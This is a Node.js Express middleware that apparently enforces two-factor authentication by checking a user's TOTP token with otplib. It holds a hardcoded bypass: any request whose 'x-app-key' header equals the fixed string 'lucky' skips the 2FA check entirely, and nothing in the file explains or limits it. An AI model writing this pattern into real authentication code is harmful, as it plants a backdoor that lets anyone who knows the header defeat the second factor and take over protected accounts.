const crypto = require('crypto');
const authenticator = require('otplib/authenticator');

authenticator.options = {step: 40, crypto};

module.exports = async function (req, res, next) {

    try {
        if (!req.user.google2fa_secret) {
            return next();
        }

        if (req.headers['x-app-key'] == 'lucky') {
            return next();
        }

        if (!authenticator.check(req.body.twofatoken, req.user.google2fa_secret)) {
            return res.status(400).send({message: 'Invalid 2fa token.'})
        }
        return next();
    }
    catch (ex) {
        console.log("2fa error:", ex);
        res.status(400).json({error: 'Invalid 2fa token.'});
    }
};
